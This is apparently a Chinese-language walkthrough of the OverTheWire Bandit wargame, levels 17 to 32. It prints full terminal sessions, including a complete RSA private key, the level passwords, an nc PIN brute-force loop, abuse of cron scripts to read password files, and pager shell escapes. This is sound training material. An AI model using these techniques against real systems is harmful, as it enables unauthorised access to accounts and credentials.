3e 5e 1f a9 cf d6 ..}.3..1@.>^.... Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK JQttfApK4SeyHwDlI9SXGR50qclOAil1 Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed \u8fd4\u56de\u4e86\u6b63\u786e\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u5199\u5165/tmp\u4e0b\u7684\u67d0\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u7ed9\u5b83\u53ea\u6709\u81ea\u5df1\u53ef\u8bfb\u53ef\u5199\u5373\u53ef # \u9996\u5148\u9700\u8981\u5728tmp\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u628a\u5bc6\u94a5\u5199\u8fdb\u53bb\uff0c\u7136\u540echmod 666\u90a3\u4e2a\u6587\u4ef6 bandit16@bandit:/tmp/a$ ssh -i 1.private bandit17@localhost -p 2220 --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit17@bandit:~$ level18 \u76f4\u63a5diff bandit17@bandit:~$ diff passwords.old passwords.new 42c42 < glZreTEH1V3cGKL6g4conYqZqaEj0mte --- > hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg bandit17@bandit:~$ \u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u5c31\u662f\uff1a \u250c\u2500[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:02:46]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed. level19 \u8fd9\u4e2a\uff0c\u544a\u8bc9\u4e86\u4f60\u6587\u4ef6\u540d\u548c\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\uff0c\u800c\u4e0d\u662f\u94fe\u63a5\u4e00\u4e2abash \u56e0\u6b64\u53ef\u4ee5\u73a9\u513f\u4e00\u4e2a\u9a9a\u64cd\u4f5c \u250c\u2500[Fail][myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:09:29]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 -t cat readme _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC Connection to bandit.labs.overthewire.org closed. level20 \u5c31\u662f\u8fd0\u884c\u8fd9\u4e2a\u5c0f\u6587\u4ef6 bandit19@bandit:~$ ./bandit20-do --help Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...] Set each NAME to VALUE in the environment and run COMMAND. Mandatory arguments to long options are mandatory for short options too. -i, --ignore-environment start with an empty environment -0, --null end each output line with NUL, not newline -u, --unset=NAME remove variable from the environment -C, --chdir=DIR change working directory to DIR -S, --split-string=S process and split S into separate arguments; used to pass multiple arguments on shebang lines --block-signal[=SIG] block delivery of SIG signal(s) to COMMAND --default-signal[=SIG] reset handling of SIG signal(s) to the default --ignore-signal[=SIG] set handling of SIG signals(s) to do nothing --list-signal-handling list non default signal handling to stderr -v, --debug print verbose information for each processing step --help display this help and exit --version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. SIG may be a signal name like 'PIPE', or a signal number like '13'. Without SIG, all known signals are included. Multiple signals can be comma-separated. GNU coreutils online help: <https://www.gnu.org/software/coreutils/> Full documentation <https://www.gnu.org/software/coreutils/env> or available locally via: info '(coreutils) env invocation' bandit19@bandit:~$ ./bandit20-do NAME=11020 cat /etc/bandit_pass/bandit20 VxCazJaVykI6W36BkBU0mJTCM8rR95XT bandit19@bandit:~$ level21 \u76f4\u63a5\u770b\u56fe NvEJF7oVjkddltPSrdKEFOllh9V1IBcq level22 \u5c31\u662f\u770b\u5b88\u62a4\u8fdb\u7a0b\u5728\u8fd0\u884c\u54ea\u4e2a\u811a\u672c\uff0c\u7136\u540e\u8ddf\u7740\u53bb\u627e\u3002 bandit21@bandit:~$ man cron bandit21@bandit:~$ man crontab bandit21@bandit:~$ man 5 crontab bandit21@bandit:~$ cd /etc/cron.d/ bandit21@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit21@bandit:/etc/cron.d$ cat cronjob_bandit15_root * * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit17_root * * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff bandit21@bandit:/etc/cron.d$ level23 \u548c\u4e0a\u9762\u90a3\u4e2a\u9898\u51e0\u4e4e\u4e00\u6837 bandit22@bandit:~$ cd /etc/cron.d/ bandit22@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname > /tmp/$mytarget bandit22@bandit:/etc/cron.d$ \u62ff\u5230\u811a\u672c\u4ee5\u540e\u76f4\u63a5\u6267\u884c\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7528\u6237\u662fbandit23\uff0c\u56e0\u4e3awhoami\u8f93\u51fa\u7684\u662fbandit22 bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G level24 \u8fd8\u662f\u90a3\u51e0\u6b65\uff0c\u7136\u540e\u770b\u5230\u4e86\u8fd9\u73a9\u610f\u513f bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo || exit 1 echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i fi rm -rf ./$i fi done bandit23@bandit:/var/spool/bandit24$ ll total 12 dr-xr-x--- 3 bandit24 bandit23 4096 Apr 23 18:04 ./ drwxr-xr-x 5 root root 4096 Apr 23 18:04 ../ drwxrwx-wx 13 root bandit24 4096 Jul 17 06:58 foo/ bandit23@bandit:/var/spool/bandit24$ # \u8fd9\u91cc\u6211\u6839\u672c\u6ca1\u6709\u5199\u7684\u6743\u9650\uff0c\u9898\u6539\u4e86\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f \u90a3\u4e5f\u7b80\u5355\uff0c\u5c31\u662f\u628a\u811a\u672c\u653e\u5728foo\u5e95\u4e0b \u811a\u672c\u5c31\u662f\u4e00\u4e2a\u8f93\u51fa\uff0c\u6c34\u7684\u4e00\u6279 #!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/bandit23/pass \u7136\u540e\u6267\u884c\u811a\u672c\u5c31\u884c\uff0c\u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar level25 \u8981\u5199\u7206\u7834\u811a\u672c bandit24@bandit:~$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. ^C bandit24@bandit:~$ \u811a\u672c\u5982\u4e0b\uff1a #! /bin/bash pass24=\"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar\" for i in {0..9}{0..9}{0..9}{0..9} do echo $pass24' '$i >> mydict done echo \"done loop!\" cat ./mydict | nc localhost 30002 >> re sort re | uniq -u \u4e0a\u8fb9\u513f\u6709\u4e2a\u9898\u8c8c\u4f3c\u5e94\u8be5\u7528-u\u7684\uff0cG \u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d level26 \u767b\u9646\u4e0a\u4ee5\u540e\u51fa\u73b0\u5982\u4e0b\u5185\u5bb9\uff1a bandit25@bandit:~$ ll total 32 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 bandit25 bandit25 33 Apr 23 18:04 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Apr 23 18:04 bandit26.sshkey -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit25 bandit25 4 Apr 23 18:04 .pin -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit25/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$ \u8fd9\u4e00\u6b65\u9700\u8981\u77e5\u9053etc/passwd\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6709\u4e2a \u4e2d\u6587\u535a\u5ba2 bandit25@bandit:~$ cat /etc/passwd | grep \"bandit26\" bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 bandit25@bandit:~$ \u53d1\u73b0\u4f7f\u7528more\u5c55\u793a\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u628a\u7a97\u53e3\u7f29\u5c0f\uff0c\u8ba9\u4ed6\u4e00\u4e0b\u5b50\u5c55\u793a\u4e0d\u5b8c\u9700\u8981\u7ffb\u9875\u5373\u53ef\uff0c\u7136\u540e\u8fdb\u5165vim\u6a21\u5f0f\u5c31\u53ef\u4ee5\u8fdb\u884c\u641c\u7d22\u554a\u3001\u7f16\u8f91\u554a\u4e4b\u7c7b\u7684\u4e8b\u4e86\uff0c\u5c31\u89e3\u51b3\u4e86\u3002 :r /etc/bandit_pass/bandit26 c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1 level27 \u8fd9\u4e00\u9898\u548clevel26\u4e00\u6837\uff0c\u8fd8\u5f97\u7f29\u5c0fterminal\uff0c\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684\u7f51\u4e0a\u7684\u9898\u89e3\u3002 :set shell sh=/bin/sh :sh $ ll /bin/sh: 1: ll: not found $ ls -al total 44 drwxr-xr-x 3 root root 4096 Apr 23 18:04 . drwxr-xr-x 70 root root 4096 Apr 23 18:05 .. -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile drwxr-xr-x 2 root root 4096 Apr 23 18:04 .ssh -rwsr-x--- 1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do -rw-r----- 1 bandit26 bandit26 258 Apr 23 18:04 text.txt $ file bandit27-do bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped $ ./bandit27-do Run a command as another user. Example: ./bandit27-do id $ ./bandit27-do cat /etc/bandit_pass/bandit27 YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS level28 \u4f7f\u7528git\u4ed3\u5e93 bandit27@bandit:/tmp/a$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit27/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/a$ ll total 10564 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwx-wt 317 root root 10801152 Jul 19 02:08 ../ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 repo/ bandit27@bandit:/tmp/a$ cd repo/ bandit27@bandit:/tmp/a/repo$ ll total 16 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ../ drwxrwxr-x 8 bandit27 bandit27 4096 Jul 19 02:08 .git/ -rw-rw-r-- 1 bandit27 bandit27 68 Jul 19 02:08 README bandit27@bandit:/tmp/a/repo$ cat README The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR bandit27@bandit:/tmp/a/repo$ level29 \u8fd8\u662f\u8001\u89c4\u77e9 bandit28@bandit:/tmp/b$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit28/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b$ cd repo/ bandit28@bandit:/tmp/b/repo$ ll total 16 drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ./ drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ../ drwxrwxr-x 8 bandit28 bandit28 4096 Jul 19 02:11 .git/ -rw-rw-r-- 1 bandit28 bandit28 111 Jul 19 02:11 README.md bandit28@bandit:/tmp/b/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b/repo$ git log commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD) Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 fix info leak commit abcff758fa6343a0d002a1c0add1ad8c71b88534 Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 add missing data commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78 Author: Ben Dover <noone@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 initial commit of README.md \u8fd9\u662f\u5178\u578b\u7684git\u6cc4\u9732 bandit28@bandit:/tmp/b/repo$ git diff 899b abcf diff --git a/README.md b/README.md index 5c6457b..b302105 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S bandit28@bandit:/tmp/b/repo$ level30 \u4e0b\u8f7d\u4e0b\u6765\u4ee5\u540e\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fstash\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u662f\uff0c\u90a3\u4e48\u67e5\u770b\u522b\u7684\u5206\u652f\u3002 bandit29@bandit:/tmp/c/repo$ git stash list bandit29@bandit:/tmp/c/repo$ git branch -a * master remotes/origin/HEAD -> origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/c/repo$ \u7136\u540e\u5207\u6362\u5206\u652f\u5373\u53ef bandit29@bandit:/tmp/c/repo$ git checkout dev Branch 'dev' set up to track remote branch 'dev' from 'origin'. Switched to a new branch 'dev' bandit29@bandit:/tmp/c/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS bandit29@bandit:/tmp/c/repo$ level31 \u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u7b54\u6848\uff0c\u8fd9\u73a9\u610f\u513f\u53eb\u5f15\u7528\uff0c\u8fd9\u91cc\u662f Git Pro\u6559\u7a0b bandit30@bandit:/tmp/d/repo$ git show-ref 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/heads/master 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/HEAD 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master 831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret bandit30@bandit:/tmp/d/repo$ git show 831a OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt bandit30@bandit:/tmp/d/repo$ level32 push\u6587\u4ef6 bandit31@bandit:/tmp/d/repo$ git add -f ./key.txt bandit31@bandit:/tmp/d/repo$ git commit -m \"add key.txt\" [master 462b8a5] add key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/d/repo$ git push The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit31/.ssh' (Permission denied). 